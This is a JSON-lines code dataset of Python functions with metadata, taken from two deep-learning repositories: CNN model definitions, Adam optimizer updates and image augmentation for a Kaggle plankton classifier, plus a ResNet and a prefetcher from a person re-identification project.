{"docstring": "# variable scale part\n", "func_signal": "def build_model():\n", "code": "l0_variable = nn.layers.InputLayer((batch_size, 1, patch_sizes[0][0], patch_sizes[0][1]))\nl0c = dihedral.CyclicSliceLayer(l0_variable)\n\nl1a = Conv2DLayer(l0c, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1b = Conv2DLayer(l1a, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1 = MaxPool2DLayer(l1b, ds=(3, 3), strides=(2, 2))\nl1r = dihedral_fast.CyclicConvRollLayer(l1)\n\nl2a = Conv2DLayer(l1r, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2b = Conv2DLayer(l2a, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2 = MaxPool2DLayer(l2b, ds=(3, 3), strides=(2, 2))\nl2r = dihedral_fast.CyclicConvRollLayer(l2)\n\nl3a = Conv2DLayer(l2r, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3b = Conv2DLayer(l3a, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3c = Conv2DLayer(l3b, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3 = MaxPool2DLayer(l3c, ds=(3, 3), strides=(2, 2))\nl3r = dihedral_fast.CyclicConvRollLayer(l3)\n\nl4a = Conv2DLayer(l3r, num_filters=256, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl4b = Conv2DLayer(l4a, num_filters=256, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl4c = Conv2DLayer(l4b, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl4 = MaxPool2DLayer(l4c, ds=(3, 3), strides=(2, 2))\nl4r = dihedral_fast.CyclicConvRollLayer(l4)\nl4f = nn.layers.flatten(l4r)\n\nl5 = nn.layers.DenseLayer(nn.layers.dropout(l4f, p=0.5), num_units=1024, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl5fp = nn.layers.FeaturePoolLayer(l5, ds=2)\nl5m = dihedral.CyclicPoolLayer(l5fp, pool_function=nn_plankton.rms)\n\nl6 = nn.layers.DenseLayer(nn.layers.dropout(l5m, p=0.5), num_units=1024, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl6fp = nn.layers.FeaturePoolLayer(l6, ds=2)\n\nl_variable = l6fp\n\n\n# fixed scale part\nl0_fixed = nn.layers.InputLayer((batch_size, 1, patch_sizes[1][0], patch_sizes[1][1]))\nl0c = dihedral.CyclicSliceLayer(l0_fixed)\n\nl1a = Conv2DLayer(l0c, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1b = Conv2DLayer(l1a, num_filters=8, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1 = MaxPool2DLayer(l1b, ds=(3, 3), strides=(2, 2))\nl1r = dihedral_fast.CyclicConvRollLayer(l1)\n\nl2a = Conv2DLayer(l1r, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2b = Conv2DLayer(l2a, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2 = MaxPool2DLayer(l2b, ds=(3, 3), strides=(2, 2))\nl2r = dihedral_fast.CyclicConvRollLayer(l2)\n\nl3a = Conv2DLayer(l2r, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3b = Conv2DLayer(l3a, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3c = Conv2DLayer(l3b, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3 = MaxPool2DLayer(l3c, ds=(3, 3), strides=(2, 2))\nl3r = dihedral_fast.CyclicConvRollLayer(l3)\nl3f = nn.layers.flatten(l3r)\n\nl4 = nn.layers.DenseLayer(nn.layers.dropout(l3f, p=0.5), num_units=512, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl4fp = nn.layers.FeaturePoolLayer(l4, ds=2)\nl4m = dihedral.CyclicPoolLayer(l4fp, pool_function=nn_plankton.rms)\n\nl5 = nn.layers.DenseLayer(nn.layers.dropout(l4m, p=0.5), num_units=512, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl5fp = nn.layers.FeaturePoolLayer(l5, ds=2)\n\nl_fixed = l5fp\n\n\n# merge the parts\nl_merged = nn.layers.concat([l_variable, l_fixed])\n\nl7 = nn.layers.DenseLayer(nn.layers.dropout(l_merged, p=0.5), num_units=data.num_classes, nonlinearity=T.nnet.softmax, W=nn_plankton.Orthogonal(1.0))\n\nreturn [l0_variable, l0_fixed], l7", "path": "configurations\\bagging_19_cr4_ds.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\nGenerator that runs a slow source generator in a separate thread. Beware of the GIL!\nbuffer_size: the maximal number of items to pre-generate (length of the buffer)\n\"\"\"\n", "func_signal": "def buffered_gen_threaded(source_gen, buffer_size=2):\n", "code": "if buffer_size < 2:\n    raise RuntimeError(\"Minimal buffer size is 2!\")\n \nbuffer = Queue.Queue(maxsize=buffer_size - 1)\n# the effective buffer size is one less, because the generation process\n# will generate one extra element and block until there is room in the buffer.\n \ndef _buffered_generation_thread(source_gen, buffer):\n    for data in source_gen:\n        buffer.put(data, block=True)\n    buffer.put(None) # sentinel: signal the end of the iterator\n \nthread = threading.Thread(target=_buffered_generation_thread, args=(source_gen, buffer))\nthread.daemon = True\nthread.start()\n\nfor data in iter(buffer.get, None):\n    yield data", "path": "buffering.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\nAdam update rule by Kingma and Ba, ICLR 2015.\n\nlearning_rate: alpha in the paper, the step size\n\nbeta1: exponential decay rate of the 1st moment estimate\nbeta2: exponential decay rate of the 2nd moment estimate\n\"\"\"\n", "func_signal": "def adam(loss, all_params, learning_rate=0.0002, beta1=0.1, beta2=0.001, epsilon=1e-8):\n", "code": "all_grads = theano.grad(loss, all_params)\nupdates = []\n\nfor param_i, grad_i in zip(all_params, all_grads):\n    t = theano.shared(1) # timestep, for bias correction\n    mparam_i = theano.shared(np.zeros(param_i.get_value().shape, dtype=theano.config.floatX)) # 1st moment\n    vparam_i = theano.shared(np.zeros(param_i.get_value().shape, dtype=theano.config.floatX)) # 2nd moment\n\n    m = beta1 * grad_i + (1 - beta1) * mparam_i # new value for 1st moment estimate\n    v = beta2 * T.sqr(grad_i) + (1 - beta2) * vparam_i # new value for 2nd moment estimate\n    \n    m_unbiased = m / (1 - (1 - beta1) ** t.astype(theano.config.floatX))\n    v_unbiased = v / (1 - (1 - beta2) ** t.astype(theano.config.floatX))\n    w = param_i - learning_rate * m_unbiased / (T.sqrt(v_unbiased) + epsilon) # new parameter values\n\n    updates.append((mparam_i, m))\n    updates.append((vparam_i, v))\n    updates.append((t, t + 1))\n    updates.append((param_i, w))\n\nreturn updates", "path": "nn_plankton.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "# variable scale part\n", "func_signal": "def build_model():\n", "code": "l0_variable = nn.layers.InputLayer((batch_size, 1, patch_sizes[0][0], patch_sizes[0][1]))\nl0c = dihedral.CyclicSliceLayer(l0_variable)\n\nl1a = Conv2DLayer(l0c, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1b = Conv2DLayer(l1a, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1 = MaxPool2DLayer(l1b, ds=(3, 3), strides=(2, 2))\nl1r = dihedral_fast.CyclicConvRollLayer(l1)\n\nl2a = Conv2DLayer(l1r, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2b = Conv2DLayer(l2a, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2 = MaxPool2DLayer(l2b, ds=(3, 3), strides=(2, 2))\nl2r = dihedral_fast.CyclicConvRollLayer(l2)\n\nl3a = Conv2DLayer(l2r, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3b = Conv2DLayer(l3a, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3c = Conv2DLayer(l3b, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3 = MaxPool2DLayer(l3c, ds=(3, 3), strides=(2, 2))\nl3r = dihedral_fast.CyclicConvRollLayer(l3)\n\nl4a = Conv2DLayer(l3r, num_filters=256, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl4b = Conv2DLayer(l4a, num_filters=256, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl4c = Conv2DLayer(l4b, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl4 = MaxPool2DLayer(l4c, ds=(3, 3), strides=(2, 2))\nl4r = dihedral_fast.CyclicConvRollLayer(l4)\nl4f = nn.layers.flatten(l4r)\n\nl5 = nn.layers.DenseLayer(nn.layers.dropout(l4f, p=0.5), num_units=1024, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl5fp = nn.layers.FeaturePoolLayer(l5, ds=2)\nl5m = dihedral.CyclicPoolLayer(l5fp, pool_function=nn_plankton.rms)\n\nl6 = nn.layers.DenseLayer(nn.layers.dropout(l5m, p=0.5), num_units=1024, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl6fp = nn.layers.FeaturePoolLayer(l6, ds=2)\n\nl_variable = l6fp\n\n\n# fixed scale part\nl0_fixed = nn.layers.InputLayer((batch_size, 1, patch_sizes[1][0], patch_sizes[1][1]))\nl0c = dihedral.CyclicSliceLayer(l0_fixed)\n\nl1a = Conv2DLayer(l0c, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1b = Conv2DLayer(l1a, num_filters=8, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1 = MaxPool2DLayer(l1b, ds=(3, 3), strides=(2, 2))\nl1r = dihedral_fast.CyclicConvRollLayer(l1)\n\nl2a = Conv2DLayer(l1r, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2b = Conv2DLayer(l2a, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2 = MaxPool2DLayer(l2b, ds=(3, 3), strides=(2, 2))\nl2r = dihedral_fast.CyclicConvRollLayer(l2)\n\nl3a = Conv2DLayer(l2r, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3b = Conv2DLayer(l3a, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3c = Conv2DLayer(l3b, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3 = MaxPool2DLayer(l3c, ds=(3, 3), strides=(2, 2))\nl3r = dihedral_fast.CyclicConvRollLayer(l3)\nl3f = nn.layers.flatten(l3r)\n\nl4 = nn.layers.DenseLayer(nn.layers.dropout(l3f, p=0.5), num_units=512, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl4fp = nn.layers.FeaturePoolLayer(l4, ds=2)\nl4m = dihedral.CyclicPoolLayer(l4fp, pool_function=nn_plankton.rms)\n\nl5 = nn.layers.DenseLayer(nn.layers.dropout(l4m, p=0.5), num_units=512, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl5fp = nn.layers.FeaturePoolLayer(l5, ds=2)\n\nl_fixed = l5fp\n\n\n# merge the parts\nl_merged = nn.layers.concat([l_variable, l_fixed])\n\nl7 = nn.layers.DenseLayer(nn.layers.dropout(l_merged, p=0.5), num_units=data.num_classes, nonlinearity=T.nnet.softmax, W=nn_plankton.Orthogonal(1.0))\n\nreturn [l0_variable, l0_fixed], l7", "path": "configurations\\bagging_17_cr4_ds.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\nAdam update rule by Kingma and Ba, ICLR 2015, version 2 (with momentum decay).\n\nlearning_rate: alpha in the paper, the step size\n\nbeta1: exponential decay rate of the 1st moment estimate\nbeta2: exponential decay rate of the 2nd moment estimate\nl_decay: exponential increase rate of beta1\n\"\"\"\n", "func_signal": "def adam_v2(loss, all_params, learning_rate=0.0002, beta1=0.1, beta2=0.001, epsilon=1e-8, l_decay=1 - 1e-8):\n", "code": "all_grads = theano.grad(loss, all_params)\nupdates = []\n\nfor param_i, grad_i in zip(all_params, all_grads):\n    t = theano.shared(1) # timestep, for bias correction\n    mparam_i = theano.shared(np.zeros(param_i.get_value().shape, dtype=theano.config.floatX)) # 1st moment\n    vparam_i = theano.shared(np.zeros(param_i.get_value().shape, dtype=theano.config.floatX)) # 2nd moment\n\n    beta1_current = 1 - (1 - beta1) * l_decay ** (t.astype(theano.config.floatX) - 1)\n    m = beta1_current * grad_i + (1 - beta1_current) * mparam_i # new value for 1st moment estimate\n    v = beta2 * T.sqr(grad_i) + (1 - beta2) * vparam_i # new value for 2nd moment estimate\n    \n    m_unbiased = m / (1 - (1 - beta1) ** t.astype(theano.config.floatX))\n    v_unbiased = v / (1 - (1 - beta2) ** t.astype(theano.config.floatX))\n    w = param_i - learning_rate * m_unbiased / (T.sqrt(v_unbiased) + epsilon) # new parameter values\n\n    updates.append((mparam_i, m))\n    updates.append((vparam_i, v))\n    updates.append((t, t + 1))\n    updates.append((param_i, w))\n\nreturn updates", "path": "nn_plankton.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "# variable scale part\n", "func_signal": "def build_model():\n", "code": "l0_variable = nn.layers.InputLayer((batch_size, 1, patch_sizes[0][0], patch_sizes[0][1]))\nl0c = dihedral.CyclicSliceLayer(l0_variable)\n\nl1a = Conv2DLayer(l0c, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1b = Conv2DLayer(l1a, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1 = MaxPool2DLayer(l1b, ds=(3, 3), strides=(2, 2))\nl1r = dihedral_fast.CyclicConvRollLayer(l1)\n\nl2a = Conv2DLayer(l1r, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2b = Conv2DLayer(l2a, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2 = MaxPool2DLayer(l2b, ds=(3, 3), strides=(2, 2))\nl2r = dihedral_fast.CyclicConvRollLayer(l2)\n\nl3a = Conv2DLayer(l2r, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3b = Conv2DLayer(l3a, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3c = Conv2DLayer(l3b, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3 = MaxPool2DLayer(l3c, ds=(3, 3), strides=(2, 2))\nl3r = dihedral_fast.CyclicConvRollLayer(l3)\n\nl4a = Conv2DLayer(l3r, num_filters=256, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl4b = Conv2DLayer(l4a, num_filters=256, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl4c = Conv2DLayer(l4b, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl4 = MaxPool2DLayer(l4c, ds=(3, 3), strides=(2, 2))\nl4r = dihedral_fast.CyclicConvRollLayer(l4)\nl4f = nn.layers.flatten(l4r)\n\nl5 = nn.layers.DenseLayer(nn.layers.dropout(l4f, p=0.5), num_units=1024, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl5fp = nn.layers.FeaturePoolLayer(l5, ds=2)\nl5m = dihedral.CyclicPoolLayer(l5fp, pool_function=nn_plankton.rms)\n\nl6 = nn.layers.DenseLayer(nn.layers.dropout(l5m, p=0.5), num_units=1024, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl6fp = nn.layers.FeaturePoolLayer(l6, ds=2)\n\nl_variable = l6fp\n\n\n# fixed scale part\nl0_fixed = nn.layers.InputLayer((batch_size, 1, patch_sizes[1][0], patch_sizes[1][1]))\nl0c = dihedral.CyclicSliceLayer(l0_fixed)\n\nl1a = Conv2DLayer(l0c, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1b = Conv2DLayer(l1a, num_filters=8, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1 = MaxPool2DLayer(l1b, ds=(3, 3), strides=(2, 2))\nl1r = dihedral_fast.CyclicConvRollLayer(l1)\n\nl2a = Conv2DLayer(l1r, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2b = Conv2DLayer(l2a, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2 = MaxPool2DLayer(l2b, ds=(3, 3), strides=(2, 2))\nl2r = dihedral_fast.CyclicConvRollLayer(l2)\n\nl3a = Conv2DLayer(l2r, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3b = Conv2DLayer(l3a, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3c = Conv2DLayer(l3b, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3 = MaxPool2DLayer(l3c, ds=(3, 3), strides=(2, 2))\nl3r = dihedral_fast.CyclicConvRollLayer(l3)\nl3f = nn.layers.flatten(l3r)\n\nl4 = nn.layers.DenseLayer(nn.layers.dropout(l3f, p=0.5), num_units=512, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl4fp = nn.layers.FeaturePoolLayer(l4, ds=2)\nl4m = dihedral.CyclicPoolLayer(l4fp, pool_function=nn_plankton.rms)\n\nl5 = nn.layers.DenseLayer(nn.layers.dropout(l4m, p=0.5), num_units=512, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl5fp = nn.layers.FeaturePoolLayer(l5, ds=2)\n\nl_fixed = l5fp\n\n\n# merge the parts\nl_merged = nn.layers.concat([l_variable, l_fixed])\n\nl7 = nn.layers.DenseLayer(nn.layers.dropout(l_merged, p=0.5), num_units=data.num_classes, nonlinearity=T.nnet.softmax, W=nn_plankton.Orthogonal(1.0))\n\nreturn [l0_variable, l0_fixed], l7", "path": "configurations\\bagging_18_cr4_ds.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\nestimating the correct rescaling transform is slow, so just use the\ndownscale_factor to define a transform directly. This probably isn't \n100% correct, but it shouldn't matter much in practice.\n\"\"\"\n", "func_signal": "def build_rescale_transform_fast(downscale_factor, image_shape, target_shape):\n", "code": "rows, cols = image_shape\ntrows, tcols = target_shape\ntform_ds = skimage.transform.AffineTransform(scale=(downscale_factor, downscale_factor))\n\n# centering    \nshift_x = cols / (2.0 * downscale_factor) - tcols / 2.0\nshift_y = rows / (2.0 * downscale_factor) - trows / 2.0\ntform_shift_ds = skimage.transform.SimilarityTransform(translation=(shift_x, shift_y))\nreturn tform_shift_ds + tform_ds", "path": "data.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\nscale is a DOWNSCALING factor.\n\"\"\"\n", "func_signal": "def perturb_multiscale(img, scale_factors, augmentation_params, target_shapes, rng=np.random):\n", "code": "tform_center, tform_uncenter = build_center_uncenter_transforms(img.shape)\ntform_augment = random_perturbation_transform(rng=rng, **augmentation_params)\ntform_augment = tform_uncenter + tform_augment + tform_center # shift to center, augment, shift back (for the rotation/shearing)\n\noutput = []\nfor scale, target_shape in zip(scale_factors, target_shapes):\n    if isinstance(scale, skimage.transform.ProjectiveTransform):\n        tform_rescale = scale\n    else:\n        tform_rescale = build_rescale_transform(scale, img.shape, target_shape) # also does centering\n    output.append(fast_warp(img, tform_rescale + tform_augment, output_shape=target_shape, mode='constant').astype('float32'))\n\nreturn output", "path": "data.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\nscale is a DOWNSCALING factor.\n\"\"\"\n", "func_signal": "def perturb_rescaled_fixed(img, scale, tform_augment, target_shape=(50, 50)):\n", "code": "tform_rescale = build_rescale_transform(scale, img.shape, target_shape) # also does centering\ntform_center, tform_uncenter = build_center_uncenter_transforms(img.shape)\ntform_augment = tform_uncenter + tform_augment + tform_center # shift to center, augment, shift back (for the rotation/shearing)\nreturn fast_warp(img, tform_rescale + tform_augment, output_shape=target_shape, mode='constant').astype('float32')", "path": "data.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\nextract a correctly sized patch from img and place it into chunk_dst,\nwhich assumed to be preinitialized to zeros.\n\"\"\"\n# # DEBUG: draw a border to see where the image ends up\n# img[0, :] = 127\n# img[-1, :] = 127\n# img[:, 0] = 127\n# img[:, -1] = 127\n\n", "func_signal": "def extract_image_patch(chunk_dst, img):\n", "code": "p_x, p_y = chunk_dst.shape\nim_x, im_y = img.shape\n\noffset_x = (im_x - p_x) // 2\noffset_y = (im_y - p_y) // 2\n\nif offset_x < 0:\n    cx = slice(-offset_x, -offset_x + im_x)\n    ix = slice(0, im_x)\nelse:\n    cx = slice(0, p_x)\n    ix = slice(offset_x, offset_x + p_x)\n\nif offset_y < 0:\n    cy = slice(-offset_y, -offset_y + im_y)\n    iy = slice(0, im_y)\nelse:\n    cy = slice(0, p_y)\n    iy = slice(offset_y, offset_y + p_y)\n\nchunk_dst[cx, cy] = uint_to_float(img[ix, iy])", "path": "data.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"Wait for threads to terminate.\"\"\"\n", "func_signal": "def stop(self):\n", "code": "self.stop_event.set()\nfor thread in self.threads:\n  thread.join()", "path": "aligned_reid\\dataset\\Prefetcher.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"Constructs a ResNet-18 model.\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def resnet18(pretrained=False):\n", "code": "model = ResNet(BasicBlock, [2, 2, 2, 2])\nif pretrained:\n  model.load_state_dict(remove_fc(model_zoo.load_url(model_urls['resnet18'])))\nreturn model", "path": "aligned_reid\\model\\resnet.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
